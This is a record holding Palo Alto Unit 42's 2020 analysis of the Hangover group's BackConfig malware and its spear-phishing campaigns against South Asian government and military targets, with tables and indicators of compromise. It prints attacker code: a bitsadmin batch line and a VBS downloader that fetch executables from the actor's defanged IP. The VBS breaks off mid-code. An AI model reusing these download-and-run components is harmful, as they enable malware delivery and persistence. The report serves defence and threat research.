{
    "id": "f5b6bd55-67ea-44b5-8505-e0b5f1341d38",
    "created_at": "2023-01-12T15:05:37.241333Z",
    "updated_at": "2025-03-27T02:15:06.261337Z",
    "deleted_at": null,
    "sha1_hash": "45c9537e0d6a34361357f3fef44a12a0f726c772",
    "title": "2020-05-11 - Updated BackConfig Malware Targeting Government and Military Organizations in South Asia",
    "authors": "",
    "file_creation_date": "2022-05-28T02:38:40Z",
    "file_modification_date": "2022-05-28T02:38:40Z",
    "file_size": 1727338,
    "plain_text": "# Updated BackConfig Malware Targeting Government and Military Organizations in South Asia\n\n**[unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/](https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/)**\n\nAlex Hinchliffe, Robert Falcone May 12, 2020\n\nBy [Alex Hinchliffe and](https://unit42.paloaltonetworks.com/author/alex-hinchliffe/) [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nMay 11, 2020 at 9:30 PM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [BackConfig,](https://unit42.paloaltonetworks.com/tag/backconfig/) [Hangover Threat Group,](https://unit42.paloaltonetworks.com/tag/hangover-threat-group/) [spearphishing](https://unit42.paloaltonetworks.com/tag/spearphishing/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/updated-backconfig-malware-targeting-government-and-military-organizations/)\n\n## Executive Summary\n\n[Unit 42 has observed activity over the last 4 months involving the BackConfig malware used by the Hangover threat](https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china-en/)\ngroup (aka Neon, Viceroy Tiger, MONSOON). Targets of the spear-phishing attacks, using local and topical lures,\nincluded government and military organizations in South Asia.\n\nThe BackConfig custom trojan has a flexible plug-in architecture for components offering various features, including\nthe ability to gather system and keylog information and to upload and execute additional payloads.\n\nThe initial infection occurs via a weaponized Microsoft Excel (XLS) document delivered via compromised legitimate\nwebsites for which the URLs are most likely shared via email. The documents use Visual Basic for Applications\n(VBA) Macro code which, if enabled by the victim, starts an installation process consisting of multiple components\nthat result in the plug-in loader payload being downloaded and executed. The modular nature certainly allows for\nquicker changes to individual components and, perhaps more importantly for the attackers, splits up the malicious\nbehaviors in such a way that could thwart sandbox and dynamic analysis systems, especially when analyzing the\ncomponents in isolation.\n\n\n-----\n\nOur [threat prevention platform with](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention) [WildFire detects activity associated with this threat group, while simultaneously](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\nupdating the ‘malware’ category within the PAN-DB [URL filtering solution for malicious and/or compromised](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\ndomains that have been identified.\n\nIndicators of compromise related to this research are documented at the end of this report and in the Adversary\n[Playbook for the Hangover threat group that can be accessed in the Unit 42 Playbook Viewer.](https://pan-unit42.github.io/playbook_viewer/?pb=hangover)\n\n**Starting Point**\n\nUnit 42 first saw activity involving the Windows PE executable file (SHA256:\n84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c) when searching AutoFocus data\nrelated to particular sectors and countries of interest.\n\nThe file was first seen on January 19th, 2020, having been downloaded by two organizations -- a government\ndepartment in one country and a military organization in another -- within minutes of each other. The source of the\ndownload was http://212.114.52[.]148/request/httpsrequest and the file httpsrequest was stored locally as dphc.exe.\nMore details on how the malware was delivered are described later in the blog.\n\nThe choice of terminology in URL paths and file names when delivering BackConfig malware in this, and other\ncampaigns discussed later on, is clearly to blend in as benign operations, paths and filenames. Although spelled\ndifferently, it could be easy to believe the payload relates to the DHCP networking service.\n\nThe purpose of this malware is to allow the actors to download and execute an executable file, as well as download\nand run batch files to run commands on the end system.\n\nThis sample has a custom \"decryption\" routine that subtracts six from each character. The following strings are\ndecrypted using this method:\n\nlinkrequest[.]live\n\\\\Adobe\\\\Driver\\\\dwg\\\\pid.txt\n\\\\Adobe\\\\Driver\\\\dwg\\\\\n\\\\Adobe\\\\Driver\\\\dwg\\\\wuaupdt.exe\n\nThe Trojan reads the following file to use in the URL of the C2 beacon. If the file does not exist, the executable will\nexit without performing any further activities. The pid.txt file is created during the earlier delivery and installation\nphases starting with the weaponized Excel document. More information about this setup process is covered later in\nthe delivery section. As previously mentioned, this behavior makes an automated analysis of the individual\nexecutable payload component harder.\n\n%USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\n\nThe C2 channel uses HTTPS thanks to the INTERNET_FLAG_SECURE flag used when calling the\nHttpOpenRequestA function. The beacon HTTP request will look like the following:\n\nGET /orderme/[contents of pid.txt file] HTTP/1.1\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 @/NEW\n\nHost: linkrequest[.]live [resolving to 23.106.123[.]87]\n\nThe Trojan will look for the following field and values within the HTTP response header:\n\n\"Content-Type: application\"\n\"Content-Type: xDvsds\"\n\"Content-Type: Bw11eW\"\n\nIf the content-type field contains a value of application, the Trojan will extract a filename from the HTTP response\nheaders between the string filename and Content-Transfer-Encoding. It will use this filename to create a file in the\n%USERPROFILE%\\Adobe\\Driver\\dwg\\ folder which it will write the data in the HTTP response to Based on the\n\n\n-----\n\nother two Content Types, we believe the filename provided will be either wuaupdt.exe or test.bat.\n\nIf the content-type field has a value of xDvsds, the Trojan will attempt to execute the following file using\nShellExecuteA and the \"open\" method:\n\n%USERPROFILE%\\Adobe\\Driver\\dwg\\wuaupdt.exe\n\nIf the content-type field has a value of Bw11eW, the Trojan will attempt to execute the following file using\nShellExecuteA and the \"open\" method:\n\n%USERPROFILE%\\Adobe\\Driver\\dwg\\test.bat\n\nAt the time of writing, the C2 appeared inoperational and no further payloads were seen. We believe that the\nresultant wuaupdt.exe file would then provide further capabilities to steal information, log keystrokes, and provide\nthe ability to run additional commands either directly or via additional plugins which it would download, as\n[documented by the Qihoo 360 Threat Intelligence group in their investigation of prior campaigns here.](https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china-en/)\n\nUnit 42 has conducted cursory binary diffing for many of the BackConfig executable files and did not find any nonlibrary function overlaps that would suggest that the payloads are based on the YTY or EHDev frameworks as\n[mentioned here and](https://www.netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia) [here.](https://labs.bitdefender.com/2017/09/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/)\n\n**PE Metadata**\n\nThe malware sample contains some interesting static artifacts including self-signed digital certificates used to sign\nthe executable purporting to be software from the Foxit Software Incorporated company based in California. It is not\nknown why the actors picked this company -- and others listed in Table 1 below -- to impersonate but, as previously\nmentioned, their use of filenames and URLs makes their payloads appear benign and trustworthy.\n\nUsing this meta-data, together with information gleaned from infrastructure investigation, Unit 42 were able to pivot\naround on AutoFocus data to find additional BackConfig PE executable samples. Those samples from the last 12\nmonths are listed in Tables 1 and 2 below.\n\n**SHA256** **Compilation Time (UTC)** **First Seen (Pacific)** **Signer Name**\n\n84e5629... 01/20/2020 7:26:09am 01/19/2020 11:49:03pm Foxit Software Incorporated\n\n18ce3ee... 10/10/2019 9:22:11am 01/16/2020 4:30:26pm\n\n4a4bc01... 11/21/2019 9:19:49am 01/16/2020 1:31:46am wind0ws\n\n91c67c1... 11/21/2019 9:19:49am 12/02/2019 2:03:41am\n\nde5b670... 11/21/2019 9:19:49am 11/21/2019 11:59:05pm\n\nf79ebf0... 10/28/2019 5:35:26am 11/09/2019 10:32:09pm NVIDIA Corporation\n\n31faeef... 10/10/2019 9:22:11am 10/13/2019 10:11:04pm Foxit Software Incorporated\n\nd87b875... 09/12/2019 5:54:04am 09/26/2019 9:32:19am Digicert Global\n\n1510996... 12/05/2018 4:35:03am 04/09/2019 10:30:16am Foxit Software Incorporated\n\n_Table 1. Describing PE compile times and Digital signatures used, ordered by first seen._\n\nThe Compilation Time stored in executable (SHA256: 84e5629...) appears to be after the point at which the file was\nfirst seen by our WildFire analysis system. While the PE file timestamp could be modified post-compilation, the\noddity is more likely explained away with time zones -- 2349 Pacific time on the 19th is 1349 in Bangladesh on the\n20th, and 7:26am UTC is in the range of 11:26 to 13:26 across the South Asia region, which would make the sample\ncompilation quite recent with respect to the delivery of it.\n\n\n-----\n\nMore details about the self signed digital certificates, as well as full hashes, can be found in the IOCs section at the\nend of this report.\n\nThe following table shows the version information from the same PE files, grouped by similar File Description fields.\nThe order remains the same, except for the sample (SHA256: 18ce3ee...) which was first seen January 16th, 2020\nbut for some reason reverted to using exact version information seen in samples two to three months prior. Namely,\nLink Finder.\n\n\n**SHA256** **File**\n**Description**\n\n84e5629... Альберт\n**(Albert, in**\n**English)**\n\n4a4bc01... Ссылка\n**(Link, in**\n**English)**\n\n91c67c1...\n\nde5b670...\n\n\n**File**\n**Version**\n\n\n**Product**\n**Name**\n\n\n**Product**\n**Version**\n\n\n**Copyright**\n\n\n06.10.2015 Альберт 01.05.2015 Copyright @ 2015-2026 secosec\n\n01.01.12 ссылка 10.01.2015 Copyright @ 2011-2021 secosec Inc. Все\nправа защищеныk (All rights reserved,\n**in English)**\n\n\n18ce3ee... Link Finder 01.01.12 Link\nFinder\n\nf79ebf0...\n\n31faeef...\n\n\n13,9,1632 Copyright @2011-2020 Techtest Inc. All\nRights Reserved\n\n\nd87b875... scrapper 01.12.001 scrapper 13,6,1662 Copyright @Scrapper Ltd Reserved\n\n\n1510996... system\nprocess\n\n\n2,1,1,2015 system\nprocess\ncleaner\n\n\n2,1,1,2015 Copyright © 2004-2018 Foxit Software Inc.\nAll Rights Reserved\n\n\n_Table 2. Describing PE version info metadata, ordered by first seen and grouped on matching data._\n\nOf the set, the file (SHA256: 1510996...) has most consistency in terms of a theme, using the Foxit Copyright\ninformation, self-signed digital signature and even using the company logo, as shown in the Figure below, for the\nexecutable file’s icon. The file’s copyright information only differs from that of Foxit’s Reader software by a missing\nperiod symbol, implying it was copied rather than created.\n\nThe actors then moved to use seemingly fictitious company and product names while using a mixture of signer\nnames in their digital signatures. No file icons were used at all over the last 11 months.\n\nRecent samples also included Cyrillic text in the file description, product name, and copyright fields, as shown and\ntranslated in the table above. It’s hard to know if this is an attempt to set false flags as to the origins of the\nBackConfig malware, or perhaps to make the content more relevant to specific targets within the victim\norganizations.\n\n**Delivery and Installation**\n\nIn this section, we describe how the various payloads are delivered based on what we have seen in our customer\nnetworks, as well as what we have established through open-source research. Unit 42 has yet to see any evidence\nof weaponized documents used to deliver BackConfig being attached on phishing emails and that phishing URL\nlinks in emails appear to be the Hangover group’s modus operandi.\n\n\n-----\n\nThe remainder of this section focuses largely on Object Linking and Embedding (OLE) Microsoft Excel documents,\nas they are most commonly used by the Hangover group, at least when it comes to the BackConfig malware.\nThrough infrastructure analysis however, Unit 42 was able to find a BackConfig PE sample (SHA256:\ne28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f; first seen 10/24/2019) using the C2\ndomain matissues[.]com and dropped by the weaponised Rich Text Format (RTF) file (SHA256:\n752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f) from the same day. The RTF used the\n[CVE-2017-11882 exploit against equation editor vulnerabilities in Office applications to execute the PE sample](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882)\nwhich was a unique exploitation method compared to all other samples analyzed.\n\n**Compromised Third-Party Infrastructure**\n\nContinuing to pivot on data obtained from the samples found thus far, we discovered some related URLs relating to\ncompromised third-party infrastructure supporting the delivery of the BackConfig malware. The following table lists\nsome examples of compromised sites delivering weaponised XLS files with filenames, such as Circular_No_03.xls\n(SHA256: 0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf) and\nCircullar_Nov_2017.xls (SHA256: ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb)\nimplying (even with incorrect spelling) that the contents is, or relates to, a letter or advertisement which is distributed\nto a large number of people.\n\n**SHA-256** **First Seen** **Related URL** **Description** **Location**\n\n\nbe3f12b... 2019-10 http://nsaimmigration[.]com/userfiles/image/\nfbr.php and nphp_registration_form.php\n(both HTTP 404)\n\n0aa5cf1... 2018-09 http://webtechhub[.]com/wordpress/wpcontent/images/fbr_circular.php\n\n\nConsultant\nand Legal\nAdvice\ncompany\nsupporting\nstudents to\nlive and\nstudy\nabroad.\n\nWeb design\nand dev site\nrunning\noutdated\nWordPress\napplication\n\n\nPakistan\n\nPakistan\n\nMaldives\n\n\ned638b5... 2017-11 http://alphamike.com[.]mv/housing Shipping\nagency for\nfreight\nforwarding\nand cargo\ndelivery.\n\n\nhttp://mgamphs.edu[.]bd/info/\n(down)\n\n\nMuhurigonj\nAcademy of\nMusic and\nPerformance\nHigh School.\n[Reference.](https://twitter.com/malwrhunterteam/status/928619159306555392)\n\n\nBangladesh\n\n\n_Table 3. Compromised third-party infrastructure to support delivery of BackConfig._\n\nGiven the targeting related to these threats, and the compromised third-party websites, we believe the use of “fbr” in\nsome of the URLs above likely relates to the Federal Board of Revenue (FBR) government organization of Pakistan.\nThe “fbr” theme also runs into the VBA macro code. File ed638b5... contains the statement Const WelcomePage =\n\"FBR\".\n\n\n-----\n\nThe old compromised hosting examples in Table 3 above do not rely on Hypertext Preprocessor (PHP) server side\nscripts to deliver the weaponized XLS files. Instead, the pages simply used HTTP response status 301 (Moved\nPermanently) for URL redirection to said XLS, initiating the download. More recent examples make use of PHP with\nURL filenames matching the social engineering theme, such as “fbr”. In addition, the actors use the PHP script to\nlog any visitors to the page noting in a file named “info.txt” the datetime stamp of the event, the client operating\nsystem, and their IP address.\n\nThe location of the compromised third-party infrastructure or the organizations legitimately using them, align with the\ntargeting Unit 42 has seen. This could be pure coincidence, a sign from the threat actors that their intention is to\ntake advantage of weaknesses in the target country’s wider infrastructure, or the threat actors leveraging in-country\ninfrastructure that may be considered more trustworthy by the intended victims and their security solutions.\n\nPalo Alto Networks’ WildFire sandbox analyzed sample ed638b5... on November 8th, 2017, and, as described in the\ntable above, the sample was hosted on two compromised websites: a Bangladesh school and a Maldivan shipping\nagency. While Unit 42 has not seen Hangover activity in the Maldives, the archipelago is in the region alongside\nother known targets and interestingly, swore in a new President about a week after Unit 42 analyzed the sample.\n\nThe EXE payload (SHA256: 4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd)\ndownloaded directly by the VBA code in sample ed638b5... from the URL below relates to those documented by\n[BitDefender here. To date, Unit 42 has only seen 6 similar samples since the late-2017 timeframe for this sample,](https://labs.bitdefender.com/2017/09/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/)\ncompared to many more prior, perhaps indicating a change over of the custom payloads used by the Hangover\ngroup. Certainly, there are some overlaping Tactics Techniques and Procedures (TTPs) between the older samples\nand the more recent BackConfig samples.\n\nhttp://chancetowin.quezknal[.]net/appstore/updatepatch/logs.exe\n\n**Evolution of Delivery Payloads**\n\nBefore moving on to describe the most recent samples and installation methods used by the Hangover actors, the\ntimeline figure below provides a high-level view of the evolution in TTPs used.\n\nFigure 2. Evolution of delivery\n\npayloads\nDespite the evolution over the years, some habits are hard to break. Firstly, every weaponized XLS Unit 42 has\ninvestigated loads a fake error message, such as the one shown in Figure 3 below, to trick the victim into thinking\nthat the file is corrupt and thus nothing has -- or will -- load as intended. Another fictitious error message text has\nbeen used in the past often with poor spelling or grammar.\n\n\n-----\n\nFigure 3. Example fake error\n\nmessage displayed to the victim.\nSimilarly, the version information metadata stored in all the Excel documents analyzed share the same Author and\nLast Modified By names - Testing.\n\nThe following subsections describe the campaigns and malware as highlighted by the three most recent milestones\nin the timeline figure above.\n\n**2019 Milestone: Multi-Component**\n\nRegistration Form.xls (SHA256: be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461)\nlisted in Table 3 above provides an example of the types of lures used by the threat actors.\n\nUpon opening the XLS and enabling the macro code, the picture in Figure 4 below is shown on top whitebackground cells. As the filename suggests, it’s a registration form and relates to the Naya Pakistan Housing\nprogram run by the Pakistani government to help solve the housing shortfall in the country. Eligible citizens include\ngovernment employees and registration forms were due by October 15th, 2019 (extended through November 15th),\nmeaning the timing and the lure of the campaign on October 25th were clearly planned to increase the chances of\ncompromise.\n\n\n-----\n\nFigure 4. Social engineering\n\nlure against Pakistan government in October 2019\nAs the PHP webpages did not exist at the time of writing, Unit 42 cannot prove the XLS file be3f12b... was hosted at\nthe URL listed in row 1 of Table 3 above. However, because of the following points, we have high confidence in the\ncampaign relationship between the two.\n\n1.\n\n1. AutoFocus and VirusTotal first processed the XLS file be3f12b... on October 25th, 2019\n2. VirusTotal processed the nsaimmigration... URL on the same day\n3. A specific HTTP GET request URL using the notation nphp_registration_form.php?r= was processed in\n\nVirusTotal on the same day, and has relations to http://185.203.119[.]184/fin_div/session, which matches\nthe IP address and URL structure in the VBS code dropped by the XLS be3f12b....\n4. The name of the PHP webpage nphp_registration_form.php relates to the filename of the XLS.\n\nThe VBA macro code in the XLS file be3f12b... differed somewhat from that of the samples of the previous years.\nInstead of directly storing encoded EXE files or running batch shell commands directly from the VBA code itself, it\nretrieved the content from hidden columns in the Excel sheet, starting at column 27 or “AA”, which is likely to be offscreen for most people. Once the font colour was changed, the “setup” batch code component as per previous\nvariants, and the new Visual Basic Script (VBS) downloader component were revealed in columns AA and AB,\nrespectively, as shown in figure 5 below.\n\n\n-----\n\nFigure 5. VBS downloader and\n\nBAT setup file revealed in the XLS sheet.\nMacro VBA code in the XLS parses the content of the two columns line by line writing the contents to their\nrespective files on disk and executing them following the same process flow as described below in Figure 6.\n\n**2019 Milestone: BITS and ZIPs**\n\nA more recent weaponized XLS file (SHA256:\n021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b) was analyzed by WildFire on\nNovember 15th, 2019 and exposed some new techniques. On this occasion, the VBA macro code contained a\ndecimal-encoded ZIP file of only 1,062 bytes in size. Inside the ZIP archive were two text files that would be\ndecompressed to a folder driverkit. One file, driverkit.bat, is the “setup” BAT file already discussed in this report and\nlisted in the appendix section. The other file, Winmgt.txt, is an adaptation of the VBS downloaded also described in\nthis report. However, instead of a direct HTTP download using an MSXML DOM object, this version writes the\nfollowing contents to Winmgt_Drive.bat, which is executed by a third scheduled task created by the “setup” BAT file.\n\n\n1\n2\n3\n4\n5\n6\n\n\necho off\nbitsadmin /transfer Microsoft_Update /download /priority high\nhttp://185.203.119[.]184/winmgt/winmgt.exe\n%USERPROFILE%\\Adobe\\Driver\\pdf\\winmgt.exe\n\ndel %0\n\n\n**2020 Milestone: Fine Tuning**\n\nThe following execution flow diagram is based on one of the most recent weaponized documents Unit 42 has seen\nInvoice.xls (SHA256: 8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c; first seen 202001-15).\n\nThe infection process consists of multiple components as just described. The “setup” batch (BAT) file coordinates\nmuch of the infection process of the BackConfig plug-in loader once the VBA has written it to disk and executed it.\n\n\n-----\n\nFigure 6. Execution flow of\n\n\nBackConfig malware\nThe numbered bullet list below describes Figure 6.\n\n\n-----\n\n1.\n\n1. Text file Drive.txt (SHA-256:\n\n4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1) is created and contains\nthe decimal-decoded VBS content.\n2. Similarly, the VBA code then writes batch code to another text file - Audio.txt. The content of both files is\n\nshown in the appendix section of this report.\n3. Audio.txt is renamed to Audio.bat and executed.\n4. Audio.bat cleans up any files and folders related to previous infections, and recreates the required\n\nenvironment including creating the aforementioned pid.txt file, and setting various folders and files to be\nhidden from a default Windows Explorer view. The contents of pid.txt is the victim’s computer name\nconcatenated with a hyphen followed by a random number, although I believe the code used would not\nwork as intended.\n5. Audio.bat continues by creating two scheduled tasks referencing two files that are yet to exist: dphc.exe\n\nwill run every 10 minutes and Drive.vbs at 20 minute intervals.\n6. Finally, before deleting itself, Audio.bat will rename Drive.txt to Drive.vbs. When Drive.vbs is eventually\n\nexecuted by the task scheduler, it will download the BackConfig executable payload. In the case of file\n8892279f3... the remote location is http://185.203.119[.]184/Dropbox/request.\n7. When dphc.exe is eventually executed by the task scheduler, it first checks for the presence of pid.txt\n\n(step 4.) and only continues if the file exists.\n\nUltimately, the XLS writes two files to disk, one of which -- the BAT -- immediately modifies some system settings\nand creates two scheduled tasks. However, this behaviour may not be enough to determine the components as\nmalicious. Only after 20 minutes will the task scheduler execute the VBS downloader component and launch the\nBackConfig loader EXE, by which time analysis systems may have stopped monitoring.\n\n**ATT&CK**\n\nThe following table describes the TTPs associated with the multiple campaigns described in this report.\n\n**Tactic** **Technique (Mitre ATT&CK ID)**\n\nTechnical Information Gathering Acquire OSINT data sets and information (T1247)\n\nConduct social engineering (T1249)\n\nAdversary Opsec Compromise 3rd party infrastructure to support delivery\n(T1312)\n\nBuild Capabilities Create custom payloads (T1345)\n\nObtain/re-use payloads (T1346)\n\nStage Capabilities Upload, install, and configure software/tools (T1362)\n\nInitial Compromise Spear Phishing Link (T1192)\n\nExecution User Execution (T1204)\n\nExploitation for Client Execution (T1203)\n\nExecution, Persistence Scheduled Task (T1053)\n\nDefense Evasion Code Signing (T1116)\n\nDeobfuscate/Decode Files or Information\n(T1140)\n\nHidden Files and Directories (T1158)\n\n\n-----\n\nObfuscated Files or Information (T1027)\n\nDefense Evasion, Execution Scripting (T1064)\n\nDefense Evasion, Persistence BITS Jobs (T1197)\n\nCommand & Control Commonly Used Port (T1043)\n\nStandard Application Layer Protocol (T1071)\n\nStandard Cryptographic Protocol (T1032)\n\nRemote File Copy (T1105)\n\n## Conclusion\n\nThe Hangover group (aka Neon, Viceroy Tiger, MONSOON) is active and targeting, according to Unit 42’s visibility,\ngovernment and military organisations in South Asia using spear-phishing emails containing letters or government\nforms to lure victims into browsing to compromised websites serving weaponized Excel documents that install the\nBackConfig Trojan. Almost exclusively, Unit 42 has seen the use of weaponized documents that require user\nexecution. Only once in the last six months have we seen use of exploits to circumvent the need for the user to\nexecute any part of the installation chain.\n\nThe evolution of BackConfig’s primary and secondary payloads has seen different methods used for executing\ncommands and deploying executables both with and without obfuscation.\n\nThe latest versions contain modular components making it easier to update and re-use code in order to rapidly\ndeploy their campaigns in a timely manner to have the highest chance of success. The method in which the latest\nsamples execute also indicates the group’s focus on trying to evade sandbox and other automated analysis systems\nby breaking down malicious activity into chunks that each seem relatively benign.\n\nProtections:\n\nCortex XDR protects endpoints from all malware, exploits and fileless attacks associated with Hangover\nactors.\n\nWildFire® cloud-based threat analysis service accurately identifies samples associated with these malware\nfamilies.\n\nThreat Prevention provides protection against the known client and server-side vulnerability exploits,\nmalware, and command and control infrastructure used by these actors.\n\nURL Filtering identifies all phishing and malware domains associated with these actors and proactively\nflags new infrastructure associated with these actors before it is weaponized.\n\nUsers of AutoFocus™ contextual threat intelligence service can view malware associated with these\nattacks using the following tags:\n[More information about the Hangover group and the](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Hangover) [BackConfig malware can be found in AutoFocus.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.BackConfig)\n\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with\nour fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their\ncustomers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance,\nvisit [www.cyberthreatalliance.org. (This is added to blogs pre-shared with the CTA, when loaded into WordPress it](http://www.cyberthreatalliance.org/)\n_will be added when appropriate)._\n\n**Indicators of Compromise**\n\n**Delivery Documents**\n\n\n-----\n\n56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6\n8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c\n021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b\nbe3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461\n0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf\ned638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb\n752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f (RTF using CVE-2017-11882)\n\n**Batch Files**\n\n4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt / .bat from Naya\nHousing campaign)\nC94f7733fc9bdbcb503efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9\n6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3\n750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580\n5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295\nf64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e\n98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e\n29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096 (driverkit.bat)\nabe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003 (Winmgt_Drive.bat uses bitsadmin)\n02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c\n\n**VBS files**\n\n87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1 (One_drivers.txt / .vbs from Naya\nHousing campaign)\n952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a (Down_LinkLog.vbs)\na1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb (Winmgt.vbs using BITS)\n\n**EXE Payloads**\n\n306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644\n0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92\n84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c\n18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9\n922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709\n4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5\n677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2\nd3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f\n91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1\nde5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a\nf79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b\n9e141fe67521b75412419a8c88c199c8ebd2a135c7a8b58edced454fbc33cb77\n6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e\ne28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f\n07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda\n31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848\n15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892\nD87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861\n167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e\n4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of older set of downloaders)\nb18697e999ed5859bfbc03e1d6e900752e1cdcd85ddb71729e2b38161366e5b5 (driverkit.zip)\n\n**Infrastructure**\n\n\n-----\n\nlinkrequest[.]live (23.106.123[.]87)\nmatissues[.]com\nunique.fontsupdate[.]com\n185.203.119[.]184\n212.114.52[.]148\n\n**Digital Signatures**\n\nThe following list of self-signed digital certificates is not exhaustive, and only relates to those seen on BackConfig\nPE executables samples over the past twelve months.\n\n**Foxit:**\n\nthumbprint: 79635cb32cf16cf6bddfd563b09d7aa99ccb2c01\nissuer: CN=Foxit Software Incorporated\nsubject: CN=Foxit Software Incorporated\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 50:53:ce:ad:42:c2:70:84:4f:55:bc:76:a4:23:6c:c8\nvalid from: 1/1/2018\nvalid to: 1/1/2024\n\n**Wind0ws:**\n\nthumbprint: aa9010ff841c67cf8fb88d7f1e86a778b35bcba0\nissuer: CN=wind0ws\nsubject: CN=wind0ws\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 88:de:2e:60:7f:48:2c:81:44:54:32:29:98:22:69:70\nvalid from: 1/1/2019\nvalid to: 1/1/2025\n\n**NVIDIA:**\n\nthumbprint: 01ba433fdc7f9b1ad1baaea6c5fd69243d03d8c3\nissuer: CN=NVIDIA Corporation\nsubject: CN=NVIDIA Corporation\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 6d:39:d4:59:15:9e:8c:b3:41:da:bd:4c:dd:37:60:e1\nvalid from: 1/1/2019\nvalid to: 1/1/2025\n\n## Appendix\n\nThe following VBS and BAT code was extracted from XLS sample (SHA-256:\n8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83).\n\nVBS downloader component (SHA256:\n4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1)\n\n[Drive.txt -> Drive.vbs CODE]\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nstrFileURL = \"http://<strong>185.203.119[.]184/Dropbox/request\"</strong>\nSet oShell = CreateObject(\"WScript.Shell\")\nstrHomeFolder =\noShell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\nstrPath = \"<strong>C:\\Drivers\\dphc.exe\"</strong>\nOn Error 